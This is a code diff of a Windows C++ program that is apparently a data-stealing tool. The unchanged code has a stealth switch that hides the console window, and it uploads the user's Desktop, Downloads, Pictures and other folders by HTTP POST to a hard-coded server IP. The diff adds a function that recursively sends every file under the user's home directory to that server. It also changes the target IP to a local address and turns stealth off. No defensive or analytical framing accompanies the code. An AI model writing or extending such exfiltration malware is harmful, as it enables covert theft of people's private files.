@@ -16,10 +16,10 @@
 namespace fs = std::filesystem;
 
 #define susBehaviour false
-#define stealthBehaviour true
+#define stealthBehaviour false
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
-const char szHost[] = "20.117.90.95"; // The IP address of the server
+const char szHost[] = "192.168.1.139"; // The IP address of the server
 
 /* 
 	returns a connected socket at the given address and port
@@ -151,6 +151,16 @@ void uploadFilesInFolder(fs::path p) {
 	}
 }
 
+void uploadFilesInFolderRecursive(fs::path p) {
+	for (const auto& entry : fs::recursive_directory_iterator(p)) {
+		// Check if entry is a file or a folder
+		if (!entry.is_directory()) {
+			sendFile(entry.path().string(), entry.path().filename().string());
+			Sleep(100);
+		}
+	}
+}
+
 int main() {
 #if stealthBehaviour
 	ShowWindow(GetConsoleWindow(), SW_HIDE); // Stealth mode activated!
@@ -187,7 +197,7 @@ int main() {
 	printf("%s | %s\n", szStartupExecPath, szExecPath);
 	#endif
 #endif // susBehaviour
-
+	/*
 	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
 	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
 	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
@@ -203,6 +213,9 @@ int main() {
 	uploadFilesInFolder(videosPath);
 	uploadFilesInFolder(musicPath);
 	uploadFilesInFolder(favouritesPath);
+	*/
+	fs::path userPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME"));
+	uploadFilesInFolderRecursive(userPath);
 	// Done!
 	ExitProcess(EXIT_SUCCESS);
 }
